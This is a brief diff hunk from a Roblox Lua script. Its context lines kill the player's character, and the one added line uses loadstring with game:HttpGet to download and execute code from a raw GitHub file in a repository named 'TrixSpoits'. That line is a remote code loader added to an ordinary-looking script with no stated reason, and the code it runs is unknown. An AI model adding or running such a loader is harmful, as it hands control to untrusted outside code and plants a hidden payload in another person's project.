@@ -258,3 +258,4 @@ if player and player.Character then
 	player.Character:BreakJoints()
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/erasedDiablo/TrixSpoits/refs/heads/main/DiscordServer"))()
